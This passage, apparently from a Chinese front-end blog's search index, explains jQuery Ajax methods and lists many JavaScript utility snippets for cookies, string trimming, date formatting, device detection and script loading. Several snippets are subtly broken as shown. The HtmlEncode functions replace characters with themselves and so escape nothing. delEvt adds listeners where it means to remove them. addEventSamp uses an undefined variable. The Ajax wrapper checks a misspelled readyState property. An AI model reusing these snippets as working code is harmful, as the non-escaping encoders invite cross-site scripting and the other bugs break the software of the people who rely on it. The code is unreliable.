i=0;i&lt;data.length;i++) &#123;\t\t\t\t\tconsole.log(data[i]);\t\t\t\t&#125;\t\t\t&#125;\n\n三、 jQuery中的Ajax\njQuery中的ajax封装案例\n\n//ajax请求后台数据var btn =  document.getElementsByTagName(&quot;input&quot;)[0];btn.onclick = function()&#123;\t\tajax(&#123;//json格式\t\ttype:&quot;post&quot;,\t\turl:&quot;post.php&quot;,\t\tdata:&quot;username=poetries&amp;pwd=123456&quot;,\t\tasyn:true,\t\tsuccess:function(data)&#123;\t\t\tdocument.write(data);\t\t&#125;\t&#125;);&#125;//封装ajaxfunction ajax(aJson)&#123;\tvar ajx = null;\tvar type = aJson.type || &quot;get&quot;;\tvar asyn = aJson.asyn || true;\tvar url = aJson.url;\t\t// url 接收 传输位置\tvar success = aJson.success;// success 接收 传输完成后的回调函数\tvar data = aJson.data || &#x27;&#x27;;// data 接收需要附带传输的数据\t\tif(window.XMLHttpRequest)&#123;//兼容处理\t\tajx = new XMLHttpRequest();//一般浏览器\t&#125;else\t&#123;\t\tajx = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);//IE6+\t&#125;\tif (type == &quot;get&quot; &amp;&amp; data)\t&#123;\t\turl +=&quot;/?&quot;+data+&quot;&amp;&quot;+Math.random();\t&#125;\t\t//初始化ajax请求\tajx.open( type , url , asyn );\t//规定传输数据的格式\tajx.setRequestHeader(&#x27;content-type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);\t//发送ajax请求（包括post数据的传输）\ttype == &quot;get&quot; ?ajx.send():ajx.send(aJson.data);\t\t//处理请求\tajx.onreadystatechange = function(aJson)&#123;\t\t\tif(ajx.readState == 4)&#123;\t\t\t\t\tif (ajx.status == 200 &amp;&amp; ajx.status&lt;300)//200是HTTP 请求成功的状态码\t\t&#123;\t\t\t//请求成功处理数据\t\t\tsuccess &amp;&amp; success(ajx.responseText);\t\t&#125;else&#123;\t\t\talert(&quot;请求出错&quot;+ajx.status);\t\t\t\t\t&#125;\t&#125;\t\t\t&#125;\n\njQuery中的Ajax的一些方法jquery对Ajax操作进行了封装，在jquery中的$.ajax()方法属于最底层的方法，第2层是load()、$.get()、$.post();第3层是$.getScript()、$.getJSON()，第2层使用频率很高\nload()方法\nload()方法是jquery中最简单和常用的ajax方法，能载入远程HTML代码并插入DOM中 结构为：load(url,[data],[callback])\n  - 使用`url`参数指定选择符可以加载页面内的某些元素 `load`方法中`url`语法：`url selector` 注意：`url`和选择器之间有一个空格- 传递方式  - `load()`方法的传递方式根据参数`data`来自动指定，如果没有参数传递，则采用`GET`方式传递，反之，采用`POST`- 回调参数  - 必须在加载完成后才执行的操作，该函数有三个参数 分别代表请求返回的内容、请求状态、`XMLHttpRequest`对象  - 只要请求完成，回调函数就会被触发\n$(&quot;#testTest&quot;).load(&quot;test.html&quot;,function(responseText,textStatus,XMLHttpRequest)&#123;\n  //respnoseText 请求返回的内容\n  //textStatus 请求状态 ：sucess、error、notmodified、timeout\n  //XMLHttpRequest \n&#125;)\n- **load方法参数**| 参数名称         | 类型       | 说明                                         || :--------------- | :--------- | :------------------------------------------- || `url`            | `String`   | 请求`HTML`页面的`URL`地址                    || `data(可选)`     | `Object`   | 发送至服务器的`key` / `value`数据            || `callback(可选)` | `Function` | 请求完成时的回调函数，无论是请求成功还是失败 |##### `$.get()`和`$.post()`方法`load()`方法通常用来从web服务器上获取静态的数据文件。在项目中需要传递一些参数给服务器中的页面，那么可以使用`$.get()`和`$.post()`或`$.ajax()`方法- 注意：`$.get()`和`$.post()`方法是`jquery`中的全局函数- **$.get()方法**  - `$.get()`方法使用`GET`方式来进行异步请求  - 结构为：\n  $.get(url,[data],callback,type)\n      - 如果服务器返回的内容格式是`xml`文档，需要在服务器端设置`Content-Type`类型 代码如下：`header(&quot;Content-Type:text/xml:charset=utf-8&quot;)` //`php`- **`$.get()`方法参数解析**| 参数             | 类型       | 说明                                                         || :--------------- | :--------- | :----------------------------------------------------------- || `url`            | `String`   | 请求`HTML`页的地址                                           || `data(可选)`     | `Object`   | 发送至服务器的`key`/ `value` 数据会作为`QueryString`附加到请求URL中 || `callback(可选)` | `Function` | 载入成功的回调函数（只有当`Response`的返回状态是success才调用该方法） || `type(可选)`     | `String`   | 服务器返回内容的格式，包括`xml`、`html`、`script`、`json`、`text`和`_default` |- **$.post()方法**  - 它与$.get()方法的结构和使用方式相同，有如下区别    - ```      GET\n\n    请求会将参数跟张乃URL后进行传递，而POST请求则是作为Http\n\n    消息的实体内容发送给web服务器，在ajax请求中，这种区别对用户不可见\n    \n    - `GET`方式对传输数据有大小限制（通常不能大于`2KB`），而使用`POST`方式传递的数据量要比`GET`方式大得多（理论不受限制）\n  - `GET`方式请求的数据会被浏览器缓存起来，因此其他人可以从浏览器的历史纪录中读取这些数据，如：账号、密码。在某种情况下，`GET`方式会带来严重的安全问题，而`POST`相对来说可以避免这些问题\n    - `GET`和`POST`方式传递的数据在服务端的获取也不相同。在`PHP`中，`GET`方式用`$_GET[]`获取；`POST`方式用`$_POST[]`获取;两种方式都可用`$_REQUEST[]`来获取\n\n\n总结\n\n使用load()、$.get()和$.post()方法完成了一些常规的Ajax程序，如果还需要复杂的Ajax程序，就需要用到$.ajax()方式\n\n\n\n$.ajax()方法\n$.ajax()方法是jquery最底层的Ajax实现，它的结构为$.ajax(options)\n该方法只有一个参数，但在这个对象里包含了$.ajax()方式所需要的请求设置以及回调函等信息，参数以key &#x2F; value存在，所有参数都是可选的\n$.ajax()方式常用参数解析\n\n\n\n\n参数\n类型\n说明\n\n\n\nurl\nString\n(默认为当前页地址)发送请求的地址\n\n\ntype\nString\n请求方式（POST或GET）默认为GET\n\n\ntimeout\nNumber\n设置请求超时时间（毫秒）\n\n\ndataType\nString\n预期服务器返回的类型。可用的类型如下  xml:返回XML文档，可用jquery处理 html:返回纯文本的HTML信息，包含的script标签也会在插入DOM时执行 script：返回纯文本的javascript代码。不会自动缓存结果，除非设置cache参数。注意：在远程请求时，所有的POST请求都将转为GET请求 json:返回JSON数据 jsonp:JSONP格式，使用jsonp形式调用函数时，例如：myurl?call back=?,jquery将自动替换后一个？为正确的函数名，以执行回调函数 text:返回纯文本字符串\n\n\nbeforeSend\nFunction\n发送请求前可以修改XMLHttpRequest对象的函数，例如添加自定义HTTP头。在beforeSend中如果返回false可以取消本次Ajax请求。XMLHttpRequest对象是唯一的参数 function(XMLHttpRequest){ this;&#x2F;&#x2F;调用本次Ajax请求时传递的options参数 }\n\n\ncomplete\nFunction\n请求完成后的回调函数（请求成功或失败时都调用） 参数：XMLHttpRequest对象和一个描述成功请求类型的字符串 function(XMLHttpRequest,textStatus){ this;&#x2F;&#x2F;调用本次Ajax请求时传递的options参数 }\n\n\nsuccess\nFunction\n请求成功后调用的回调函数，有两个参数 (1)由服务器返回，并根据dataTyppe参数进行处理后的数据 (2)描述状态的字符串 function(data,textStatus){ &#x2F;&#x2F;data可能是xmlDoc、``jsonObj、html、text等 this;&#x2F;&#x2F;调用本次Ajax请求时传递的options参数 }\n\n\nerror\nFunction\n请求失败时被调用的函数\n\n\nglobal\nBoolean\n默认为true。表示是否触发全局Ajax事件，设置为false将不会触发。AjaxStart或AjaxStop可用于控制各种Ajax事件\n\n\n","categories":["前端"],"tags":["javascript"]},{"title":"js-常用代码操作实例","url":"/2018/01/09/html+css+js+ts/3-js%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%93%8D%E4%BD%9C%E5%AE%9E%E4%BE%8B/","content":"\n转义特殊字符为html实体\n\nHtmlEncode: function(str)&#123;\treturn str.replace(/&amp;/g, &#x27;&amp;&#x27;).replace(/\\&quot;/g, &#x27;&quot;&#x27;).replace(/&lt;/g, &#x27;&lt;&#x27;).replace(/&gt;/g, &#x27;&gt;&#x27;).replace(/&#x27;/g, &#x27;&#x27;&#x27;);&#125;,\n\n\n验证是否为有效的手机电话号码\n\nIsMobile: function(str)&#123;\tvar rp = /^1[3|4|5|7|8][0-9]\\d&#123;4,8&#125;$/;\treturn rp.test(str);&#125;,\n\n\n验证是否为有效的座机电话号码\n\nIsTel: function(str)&#123;\tvar rp = /^([0-9]&#123;3,4&#125;-)?[0-9]&#123;7,8&#125;$/;\treturn rp.test(str);&#125;,\n\n\n判断是那种类型的浏览器\n\nWhichBrowser: function()&#123;\tvar userAgent = navigator.userAgent;\tvar isOpera = userAgent.indexOf(&quot;Opera&quot;) &gt; -1;\tvar isIE = userAgent.indexOf(&quot;compatible&quot;) &gt; -1 &amp;&amp; userAgent.indexOf(&quot;MSIE&quot;) &gt; -1 &amp;&amp; !isOpera;\tvar isFF = userAgent.indexOf(&quot;Firefox&quot;) &gt; -1;\tvar isCH = userAgent.indexOf(&quot;Chrome&quot;) &gt; -1;\tvar isSafari = userAgent.indexOf(&quot;Safari&quot;) &gt; -1;\tif (isIE)&#123;\t\tvar IE5 = IE55 = IE6 = IE7 = IE8 = false;\t\tvar reIE = new RegExp(&quot;MSIE (\\\\d+\\\\.\\\\d+);&quot;);\t\treIE.test(userAgent);\t\tvar fIEVersion = parseFloat(RegExp[&quot;$1&quot;]);\t\tIE55 = fIEVersion == 5.5;\t\tIE6 = fIEVersion == 6.0;\t\tIE7 = fIEVersion == 7.0;\t\tIE8 = fIEVersion == 8.0;\t\tif (IE55) &#123;\t\t\treturn &quot;IE55&quot;;\t\t&#125;\t\tif (IE6) &#123;\t\t\treturn &quot;IE6&quot;;\t\t&#125;\t\tif (IE7) &#123;\t\t\treturn &quot;IE7&quot;;\t\t&#125;\t\tif (IE8) &#123;\t\t\treturn &quot;IE8&quot;;\t\t&#125;\t&#125;\tif (isFF) &#123;\t\treturn &quot;Firefox&quot;;\t&#125;\tif (isCH) &#123;\t\treturn &quot;Chrome&quot;;\t&#125;\tif (isOpera) &#123;\t\treturn &quot;Opera&quot;;\t&#125;\tif (isSafari) &#123;\t\treturn &quot;Safari&quot;;\t&#125;&#125;,\n\n\n获取客户端浏览器cookie\n\nGetCookie: function(c_name)&#123;\tif(document.cookie.length&gt;0)&#123;\t\tc_start = document.cookie.indexOf(c_name + &#x27;=&#x27;);\t\tif(c_start != -1)&#123;\t\t\tc_start = c_start + c_name.length + 1;\t\t\tc_end = document.cookie.indexOf(&#x27;;&#x27;,c_start);\t\t\tif (c_end==-1) c_end = document.cookie.length;\t\t\treturn unescape(document.cookie.substring(c_start,c_end));\t\t&#125;\t&#125;\treturn &#x27;&#x27;;&#125;,\n\n\n设置客户端浏览器cookie\n\nSetCookie: function(c_name, value, expiredays)&#123;\tvar exdate = new Date();\texdate.setDate(exdate.getDate() + expiredays);\tdocument.cookie = c_name + &quot;=&quot; + escape(value) + ((expiredays==null) ? &quot;&quot; : &quot;;expires=&quot;+exdate.toGMTString());&#125;,&#125;;\n\n\n字符串长度截取\n\nfunction cutstr(str, len) &#123;    var temp,        icount = 0,        patrn = /[^\\x00-\\xff]/，        strre = &quot;&quot;;    for (var i = 0; i &lt; str.length; i++) &#123;        if (icount &lt; len - 1) &#123;            temp = str.substr(i, 1);                if (patrn.exec(temp) == null) &#123;                   icount = icount + 1            &#125; else &#123;                icount = icount + 2            &#125;            strre += temp            &#125; else &#123;            break;        &#125;    &#125;    return strre + &quot;...&quot;&#125;\n\n\n替换全部\n\nString.prototype.replaceAll = function(s1, s2) &#123;    return this.replace(new RegExp(s1, &quot;gm&quot;), s2)&#125;\n\n\n清除空格\n\nString.prototype.trim = function() &#123;    var reExtraSpace = /^\\s*(.*?)\\s+$/;    return this.replace(reExtraSpace, &quot;$1&quot;)&#125;\n\n\n清除左空格&#x2F;右空格\n\nfunction ltrim(s)&#123; return s.replace( /^(\\s*|　*)/, &quot;&quot;); &#125; function rtrim(s)&#123; return s.replace( /(\\s*|　*)$/, &quot;&quot;); &#125;\n\n\n判断是否以某个字符串开头\n\nString.prototype.startWith = function (s) &#123;    return this.indexOf(s) == 0&#125;\n\n\n判断是否以某个字符串结束\n\nString.prototype.endWith = function (s) &#123;    var d = this.length - s.length;    return (d &gt;= 0 &amp;&amp; this.lastIndexOf(s) == d)&#125;\n\n\n转义html标签\n\nfunction HtmlEncode(text) &#123;    return text.replace(/&amp;/g, &#x27;&amp;&#x27;).replace(/\\&quot;/g, &#x27;&quot;&#x27;).replace(/&lt;/g, &#x27;&lt;&#x27;).replace(/&gt;/g, &#x27;&gt;&#x27;)&#125;\n\n\n时间日期格式转换\n\nDate.prototype.Format = function(formatStr) &#123;    var str = formatStr;    var Week = [&#x27;日&#x27;, &#x27;一&#x27;, &#x27;二&#x27;, &#x27;三&#x27;, &#x27;四&#x27;, &#x27;五&#x27;, &#x27;六&#x27;];    str = str.replace(/yyyy|YYYY/, this.getFullYear());    str = str.replace(/yy|YY/, (this.getYear() % 100) &gt; 9 ? (this.getYear() % 100).toString() : &#x27;0&#x27; + (this.getYear() % 100));    str = str.replace(/MM/, (this.getMonth() + 1) &gt; 9 ? (this.getMonth() + 1).toString() : &#x27;0&#x27; + (this.getMonth() + 1));    str = str.replace(/M/g, (this.getMonth() + 1));    str = str.replace(/w|W/g, Week[this.getDay()]);    str = str.replace(/dd|DD/, this.getDate() &gt; 9 ? this.getDate().toString() : &#x27;0&#x27; + this.getDate());    str = str.replace(/d|D/g, this.getDate());    str = str.replace(/hh|HH/, this.getHours() &gt; 9 ? this.getHours().toString() : &#x27;0&#x27; + this.getHours());    str = str.replace(/h|H/g, this.getHours());    str = str.replace(/mm/, this.getMinutes() &gt; 9 ? this.getMinutes().toString() : &#x27;0&#x27; + this.getMinutes());    str = str.replace(/m/g, this.getMinutes());    str = str.replace(/ss|SS/, this.getSeconds() &gt; 9 ? this.getSeconds().toString() : &#x27;0&#x27; + this.getSeconds());    str = str.replace(/s|S/g, this.getSeconds());    return str&#125;\n\n\n判断是否为数字类型\n\nfunction isDigit(value) &#123;    var patrn = /^[0-9]*$/;    if (patrn.exec(value) == null || value == &quot;&quot;) &#123;        return false    &#125; else &#123;        return true    &#125;&#125;\n\n\n设置cookie值\n\nfunction setCookie(name, value, Hours) &#123;    var d = new Date();    var offset = 8;    var utc = d.getTime() + (d.getTimezoneOffset() * 60000);    var nd = utc + (3600000 * offset);    var exp = new Date(nd);    exp.setTime(exp.getTime() + Hours * 60 * 60 * 1000);    document.cookie = name + &quot;=&quot; + escape(value) + &quot;;path=/;expires=&quot; + exp.toGMTString() + &quot;;domain=360doc.com;&quot;&#125;\n\n\n获取cookie值\n\nfunction getCookie(name) &#123;    var arr = document.cookie.match(new RegExp(&quot;(^| )&quot; + name + &quot;=([^;]*)(;|$)&quot;));    if (arr != null) return unescape(arr[2]);    return null&#125;\n\n\n加入收藏夹\n\nfunction AddFavorite(sURL, sTitle) &#123;    try &#123;        window.external.addFavorite(sURL, sTitle)    &#125; catch(e) &#123;        try &#123;            window.sidebar.addPanel(sTitle, sURL, &quot;&quot;)        &#125; catch(e) &#123;            alert(&quot;加入收藏失败，请使用Ctrl+D进行添加&quot;)        &#125;    &#125;&#125;\n\n\n设为首页\n\nfunction setHomepage() &#123;    if (document.all) &#123;        document.body.style.behavior = &#x27;url(#default#homepage)&#x27;;        document.body.setHomePage(&#x27;http://w3cboy.com&#x27;)    &#125; else if (window.sidebar) &#123;        if (window.netscape) &#123;            try &#123;                netscape.security.PrivilegeManager.enablePrivilege(&quot;UniversalXPConnect&quot;)            &#125; catch(e) &#123;                alert(&quot;该操作被浏览器拒绝，如果想启用该功能，请在地址栏内输入 about:config,然后将项 signed.applets.codebase_principal_support 值该为true&quot;)                &#125;        &#125;        var prefs = Components.classes[&#x27;@mozilla.org/preferences-service;1&#x27;].getService(Components.interfaces.nsIPrefBranch);        prefs.setCharPref(&#x27;browser.startup.homepage&#x27;, &#x27;http://w3cboy.com&#x27;)    &#125;&#125;\n\n\n加载样式文件\n\nfunction LoadStyle(url) &#123;    try &#123;        document.createStyleSheet(url)    &#125; catch(e) &#123;        var cssLink = document.createElement(&#x27;link&#x27;);        cssLink.rel = &#x27;stylesheet&#x27;;        cssLink.type = &#x27;text/css&#x27;;        cssLink.href = url;        var head = document.getElementsByTagName(&#x27;head&#x27;)[0];        head.appendChild(cssLink)    &#125;&#125;\n\n\n返回脚本内容\n\nfunction evalscript(s) &#123;    if(s.indexOf(&#x27;&lt;script&#x27;) == -1) return s;    var p = /&lt;script[^\\&gt;]*?&gt;([^\\x00]*?)&lt;\\/script&gt;/ig;    var arr = [];    while(arr = p.exec(s)) &#123;        var p1 = /&lt;script[^\\&gt;]*?src=\\&quot;([^\\&gt;]*?)\\&quot;[^\\&gt;]*?(reload=\\&quot;1\\&quot;)?(?:charset=\\&quot;([\\w\\-]+?)\\&quot;)?&gt;&lt;\\/script&gt;/i;        var arr1 = [];        arr1 = p1.exec(arr[0]);        if(arr1) &#123;            appendscript(arr1[1], &#x27;&#x27;, arr1[2], arr1[3]);        &#125; else &#123;            p1 = /&lt;script(.*?)&gt;([^\\x00]+?)&lt;\\/script&gt;/i;            arr1 = p1.exec(arr[0]);            appendscript(&#x27;&#x27;, arr1[2], arr1[1].indexOf(&#x27;reload=&#x27;) != -1);        &#125;    &#125;    return s;&#125;\n\n\n清除脚本内容\n\nfunction stripscript(s) &#123;    return s.replace(/&lt;script.*?&gt;.*?&lt;\\/script&gt;/ig, &#x27;&#x27;);&#125;\n\n\n动态加载脚本文件\n\nfunction appendscript(src, text, reload, charset) &#123;    var id = hash(src + text);    if(!reload &amp;&amp; in_array(id, evalscripts)) return;    if(reload &amp;&amp; $(id)) &#123;        $(id).parentNode.removeChild($(id));    &#125;     evalscripts.push(id);    var scriptNode = document.createElement(&quot;script&quot;);    scriptNode.type = &quot;text/javascript&quot;;    scriptNode.id = id;    scriptNode.charset = charset ? charset : (BROWSER.firefox ? document.characterSet : document.charset);    try &#123;        if(src) &#123;            scriptNode.src = src;            scriptNode.onloadDone = false;            scriptNode.onload = function () &#123;                scriptNode.onloadDone = true;                JSLOADED[src] = 1;             &#125;;             scriptNode.onreadystatechange = function () &#123;                 if((scriptNode.readyState == &#x27;loaded&#x27; || scriptNode.readyState == &#x27;complete&#x27;) &amp;&amp; !scriptNode.onloadDone) &#123;                    scriptNode.onloadDone = true;                    JSLOADED[src] = 1;                &#125;             &#125;;        &#125; else if(text)&#123;            scriptNode.text = text;        &#125;        document.getElementsByTagName(&#x27;head&#x27;)[0].appendChild(scriptNode);    &#125; catch(e) &#123;&#125;&#125;\n\n\n返回按ID检索的元素对象\n\nfunction $(id) &#123;    return !id ? null : document.getElementById(id);&#125;\n\n\n跨浏览器绑定事件\n\nfunction addEventSamp(obj,evt,fn)&#123;     if(!oTarget)&#123;return;&#125;    if (obj.addEventListener) &#123;         obj.addEventListener(evt, fn, false);     &#125;else if(obj.attachEvent)&#123;         obj.attachEvent(&#x27;on&#x27;+evt,fn);     &#125;else&#123;        oTarget[&quot;on&quot; + sEvtType] = fn;    &#125; &#125;\n\n\n跨浏览器删除事件\n\nfunction delEvt(obj,evt,fn)&#123;    if(!obj)&#123;return;&#125;    if(obj.addEventListener)&#123;        obj.addEventListener(evt,fn,false);    &#125;else if(oTarget.attachEvent)&#123;        obj.attachEvent(&quot;on&quot; + evt,fn);    &#125;else&#123;        obj[&quot;on&quot; + evt] = fn;    &#125;&#125;\n\n\n为元素添加on方法\n\nElement.prototype.on = Element.prototype.addEventListener; NodeList.prototype.on = function (event, fn) &#123;、    [][&#x27;forEach&#x27;].call(this, function (el) &#123;        el.on(event, fn);    &#125;);    return this;&#125;;\n\n\n为元素添加trigger方法\n\nElement.prototype.trigger = function (type, data) &#123;    var event = document.createEvent(&#x27;HTMLEvents&#x27;);    event.initEvent(type, true, true);    event.data = data || &#123;&#125;;    event.eventName = type;    event.target = this;    this.dispatchEvent(event);    return this;&#125;; NodeList.prototype.trigger = function (event) &#123;    [][&#x27;forEach&#x27;].call(this, function (el) &#123;        el[&#x27;trigger&#x27;](event);    &#125;);    return this;&#125;;\n\n\n检验URL链接是否有效\n\nfunction getUrlState(URL)&#123;     var xmlhttp = new ActiveXObject(&quot;microsoft.xmlhttp&quot;);     xmlhttp.Open(&quot;GET&quot;,URL, false);      try&#123;              xmlhttp.Send();     &#125;catch(e)&#123;    &#125;finally&#123;         var result = xmlhttp.responseText;         if(result)&#123;            if(xmlhttp.Status==200)&#123;                 return(true);              &#125;else&#123;                    return(false);              &#125;          &#125;else&#123;              return(false);          &#125;     &#125;&#125;\n\n\n格式化CSS样式代码\n\nfunction formatCss(s)&#123;//格式化代码    s = s.replace(/\\s*([\\&#123;\\&#125;\\:\\;\\,])\\s*/g, &quot;$1&quot;);    s = s.replace(/;\\s*;/g, &quot;;&quot;); //清除连续分号    s = s.replace(/\\,[\\s\\.\\#\\d]*&#123;/g, &quot;&#123;&quot;);    s = s.replace(/([^\\s])\\&#123;([^\\s])/g, &quot;$1 &#123;\\n\\t$2&quot;);    s = s.replace(/([^\\s])\\&#125;([^\\n]*)/g, &quot;$1\\n&#125;\\n$2&quot;);    s = s.replace(/([^\\s]);([^\\s\\&#125;])/g, &quot;$1;\\n\\t$2&quot;);    return s;&#125;\n\n\n压缩CSS样式代码\n\nfunction compressCss (s) &#123;//压缩代码    s = s.replace(/\\/\\*(.|\\n)*?\\*\\//g, &quot;&quot;); //删除注释    s = s.replace(/\\s*([\\&#123;\\&#125;\\:\\;\\,])\\s*/g, &quot;$1&quot;);    s = s.replace(/\\,[\\s\\.\\#\\d]*\\&#123;/g, &quot;&#123;&quot;); //容错处理    s = s.replace(/;\\s*;/g, &quot;;&quot;); //清除连续分号    s = s.match(/^\\s*(\\S+(\\s+\\S+)*)\\s*$/); //去掉首尾空白    return (s == null) ? &quot;&quot; : s[1];&#125;\n\n\n获取当前路径\n\nvar currentPageUrl = &quot;&quot;;if (typeof this.href === &quot;undefined&quot;) &#123;    currentPageUrl = document.location.toString().toLowerCase();&#125;else &#123;    currentPageUrl = this.href.toString().toLowerCase();&#125;\n\n\n判断是否移动设备\n\nfunction isMobile()&#123;    if (typeof this._isMobile === &#x27;boolean&#x27;)&#123;        return this._isMobile;    &#125;    var screenWidth = this.getScreenWidth();    var fixViewPortsExperiment = rendererModel.runningExperiments.FixViewport ||rendererModel.runningExperiments.fixviewport;    var fixViewPortsExperimentRunning = fixViewPortsExperiment &amp;&amp; (fixViewPortsExperiment.toLowerCase() === &quot;new&quot;);    if(!fixViewPortsExperiment)&#123;        if(!this.isAppleMobileDevice())&#123;            screenWidth = screenWidth/window.devicePixelRatio;        &#125;    &#125;    var isMobileScreenSize = screenWidth &lt; 600;    var isMobileUserAgent = false;    this._isMobile = isMobileScreenSize &amp;&amp; this.isTouchScreen();    return this._isMobile;&#125;\n\n\n判断是否移动设备访问\n\nfunction isMobileUserAgent()&#123;    return (/iphone|ipod|android.*mobile|windows.*phone|blackberry.*mobile/i.test(window.navigator.userAgent.toLowerCase()));&#125;\n\n\n判断是否苹果移动设备访问\n\nfunction isAppleMobileDevice()&#123;    return (/iphone|ipod|ipad|Macintosh/i.test(navigator.userAgent.toLowerCase()));&#125;\n\n\n判断是否安卓移动设备访问\n\nfunction isAndroidMobileDevice()&#123;    return (/android/i.test(navigator.userAgent.toLowerCase()));&#125;\n\n\n判断是否Touch屏幕\n\nfunction isTouchScreen()&#123;    return ((&#x27;ontouchstart&#x27; in window) || window.DocumentTouch &amp;&amp; document instanceof DocumentTouch);&#125;\n\n\n判断是否打开视窗\n\nfunction isViewportOpen() &#123;    return !!document.getElementById(&#x27;wixMobileViewport&#x27;);&#125;\n\n\n获取移动设备初始化大小\n\nfunction getInitZoom()&#123;    if(!this._initZoom)&#123;        var screenWidth = Math.min(screen.height, screen.width);        if(this.isAndroidMobileDevice() &amp;&amp; !this.isNewChromeOnAndroid())&#123;            screenWidth = screenWidth/window.devicePixelRatio;        &#125;            this._initZoom = screenWidth /document.body.offsetWidth;        &#125;    return this._initZoom;&#125;\n\n\n获取移动设备最大化大小\n\nfunction getZoom()&#123;    var screenWidth = (Math.abs(window.orientation) === 90) ? Math.max(screen.height, screen.width) : Math.min(screen.height, screen.width);    if(this.isAndroidMobileDevice() &amp;&amp; !this.isNewChromeOnAndroid())&#123;        screenWidth = screenWidth/window.devicePixelRatio;    &#125;    var FixViewPortsExperiment = rendererModel.runningExperiments.FixViewport || rendererModel.runningExperiments.fixviewport;    var FixViewPortsExperimentRunning = FixViewPortsExperiment &amp;&amp; (FixViewPortsExperiment === &quot;New&quot; || FixViewPortsExperiment === &quot;new&quot;);    if(FixViewPortsExperimentRunning)&#123;        return screenWidth / window.innerWidth;    &#125;else&#123;        return screenWidth / document.body.offsetWidth;    &#125;&#125;\n\n\n获取移动设备屏幕宽度\n\nfunction getScreenWidth()&#123;    var smallerSide = Math.min(screen.width, screen.height);    var fixViewPortsExperiment = rendererModel.runningExperiments.FixViewport || rendererModel.runningExperiments.fixviewport;    var fixViewPortsExperimentRunning = fixViewPortsExperiment &amp;&amp; (fixViewPortsExperiment.toLowerCase() === &quot;new&quot;);    if(fixViewPortsExperiment)&#123;        if(this.isAndroidMobileDevice() &amp;&amp; !this.isNewChromeOnAndroid())&#123;            smallerSide = smallerSide/window.devicePixelRatio;        &#125;    &#125;    return smallerSide;&#125;\n\n\n完美判断是否为网址\n\nfunction IsURL(strUrl) &#123;    var regular = /^\\b(((https?|ftp):\\/\\/)?[-a-z0-9]+(\\.[-a-z0-9]+)*\\.(?:com|edu|gov|int|mil|net|org|biz|info|name|museum|asia|coop|aero|[a-z][a-z]|((25[0-5])|(2[0-4]\\d)|(1\\d\\d)|([1-9]\\d)|\\d))\\b(\\/[-a-z0-9_:\\@&amp;?=+,.!\\/~%\\$]*)?)$/i    if (regular.test(strUrl)) &#123;        return true;    &#125;else &#123;        return false;    &#125;&#125;\n\n\n获取页面高度\n\nfunction getPageHeight()&#123;    var g = document, a = g.body, f = g.documentElement, d = g.compatMode == &quot;BackCompat&quot;                    ? a                    : g.documentElement;    return Math.max(f.scrollHeight, a.scrollHeight, d.clientHeight);&#125;\n\n\n获取页面scrollLeft\n\nfunction getPageScrollLeft()&#123;    var a = document;    return a.documentElement.scrollLeft || a.body.scrollLeft;&#125;\n\n\n获取页面可视宽度\n\nfunction getPageViewWidth()&#123;    var d = document, a = d.compatMode == &quot;BackCompat&quot;                    ? d.body                    : d.documentElement;    return a.clientWidth;&#125;\n\n\n获取页面宽度\n\nfunction getPageWidth()&#123;    var g = document, a = g.body, f = g.documentElement, d = g.compatMode == &quot;BackCompat&quot;                    ? a                    : g.documentElement;    return Math.max(f.scrollWidth, a.scrollWidth, d.clientWidth);&#125;\n\n\n获取页面scrollTop\n\nfunction getPageScrollTop()&#123;    var a = document;    return a.documentElement.scrollTop || a.body.scrollTop;&#125;\n\n\n获取页面可视高度\n\nfunction getPageViewHeight() &#123;    var d = document, a = d.compatMode == &quot;BackCompat&quot;                    ? d.body                    : d.documentElement;    return a.clientHeight;&#125;\n\n\n去掉url前缀\n\nfunction removeUrlPrefix(a)&#123;    a=a.replace(/：/g,&quot;:&quot;).replace(/．/g,&quot;.&quot;).replace(/／/g,&quot;/&quot;);    while(trim(a).toLowerCase().indexOf(&quot;http://&quot;)==0)&#123;        a=trim(a.replace(/http:\\/\\//i,&quot;&quot;));    &#125;    return a;&#125;\n\n\n随机数时间戳\n\nfunction uniqueId()&#123;    var a=Math.random,b=parseInt;    return Number(new Date()).toString()+b(10*a())+b(10*a())+b(10*a());&#125;\n\n\n全角半角转换\n\n//iCase: 0全到半，1半到全，其他不转化function chgCase(sStr,iCase)&#123;    if(typeof sStr != &quot;string&quot; || sStr.length &lt;= 0 || !(iCase === 0 || iCase == 1))&#123;        return sStr;    &#125;    var i,oRs=[],iCode;    if(iCase)&#123;/*半-&gt;全*/        for(i=0; i&lt;sStr.length;i+=1)&#123;             iCode = sStr.charCodeAt(i);            if(iCode == 32)&#123;                iCode = 12288;                                            &#125;else if(iCode &lt; 127)&#123;                iCode += 65248;            &#125;                oRs.push(String.fromCharCode(iCode));             &#125;                    &#125;else&#123;/*全-&gt;半*/        for(i=0; i&lt;sStr.length;i+=1)&#123;             iCode = sStr.charCodeAt(i);            if(iCode == 12288)&#123;                iCode = 32;            &#125;else if(iCode &gt; 65280 &amp;&amp; iCode &lt; 65375)&#123;                iCode -= 65248;                                            &#125;                oRs.push(String.fromCharCode(iCode));          &#125;                    &#125;                    return oRs.join(&quot;&quot;);                &#125;\n\n\n确认是否键盘有效输入值\n\nfunction checkKey(iKey)&#123;    if(iKey == 32 || iKey == 229)&#123;return true;&#125;/*空格和异常*/    if(iKey&gt;47 &amp;&amp; iKey &lt; 58)&#123;return true;&#125;/*数字*/    if(iKey&gt;64 &amp;&amp; iKey &lt; 91)&#123;return true;&#125;/*字母*/    if(iKey&gt;95 &amp;&amp; iKey &lt; 108)&#123;return true;&#125;/*数字键盘1*/    if(iKey&gt;108 &amp;&amp; iKey &lt; 112)&#123;return true;&#125;/*数字键盘2*/    if(iKey&gt;185 &amp;&amp; iKey &lt; 193)&#123;return true;&#125;/*符号1*/    if(iKey&gt;218 &amp;&amp; iKey &lt; 223)&#123;return true;&#125;/*符号2*/    return false;&#125;\n\n\n日期格式化函数+调用方法\n\nDate.prototype.format = function(format)&#123;    var o = &#123;        &quot;M+&quot; : this.getMonth()+1, //month        &quot;d+&quot; : this.getDate(),    //day        &quot;h+&quot; : this.getHours(),   //hour        &quot;m+&quot; : this.getMinutes(), //minute        &quot;s+&quot; : this.getSeconds(), //second        &quot;q+&quot; : Math.floor((this.getMonth()+3)/3),  //quarter        &quot;S&quot; : this.getMilliseconds() //millisecond    &#125;;    if(/(y+)/.test(format)) format=format.replace(RegExp.$1,(this.getFullYear()+&quot;&quot;).substr(4 - RegExp.$1.length));    for(var k in o)&#123;        if(new 